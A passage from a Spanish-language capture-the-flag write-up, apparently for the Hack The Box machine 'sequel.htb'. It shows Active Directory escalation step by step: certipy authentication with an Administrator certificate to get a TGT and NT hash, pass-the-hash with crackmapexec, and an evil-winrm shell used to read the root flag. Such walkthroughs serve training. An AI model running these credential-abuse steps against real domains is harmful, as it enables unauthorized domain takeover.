+<p class="plain-text">Esto nos crea un certificado de Administrator, ya que nos autenticaremos con el <code class="language-plaintext highlighter-rouge">pfx</code> con certipy por <code class="language-plaintext highlighter-rouge">kerberos</code> es necesario sincronizar la <code class="language-plaintext highlighter-rouge">hora</code> con la del dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo ntpdate</span><span class="p"> -s sequel.htb  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora usamos el modo <code class="language-plaintext highlighter-rouge">auth</code> de certipy indicando el <code class="language-plaintext highlighter-rouge">pfx</code>, este ademas de solicitar un TGT como <code class="language-plaintext highlighter-rouge">.ccache</code> nos muestra el hash <code class="language-plaintext highlighter-rouge">NTLM</code> del usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ certipy </span><span class="p">auth -pfx administrator.pfx 
+Certipy v4.4.0 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una forma de autenticarnos es usar el <code class="language-plaintext highlighter-rouge">ticket</code> ccache que certipy nos ha creado como autenticacion con <code class="language-plaintext highlighter-rouge">crackmapexec</code>, al ser de Administrator nos devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ export </span><span class="p">KRB5CCNAME=administrator.ccache
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb sequel.htb -k --use-kcache
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="ve">[+] </span><span class="p">sequel.htb\ from ccache </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo es innecesario ya que se nos muestra el hash <code class="language-plaintext highlighter-rouge">NT</code> que podemos usar como autenticacion, <code class="language-plaintext highlighter-rouge">crackmapexec</code> nuevamente nos devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb sequel.htb -u Administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="ve">[+] </span><span class="p">sequel.htb\Administrator:a52f78e4c751e5f5e17e1e9f3e58f4ee </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> usando el hash <code class="language-plaintext highlighter-rouge">NT</code> para un <code class="language-plaintext highlighter-rouge">passthehash</code> y conseguir una powershell, ahora podemos leer la ultima <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm </span><span class="p">-i sequel.htb -u Administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+sequel\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\root.txt
+9c1**************************d44
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
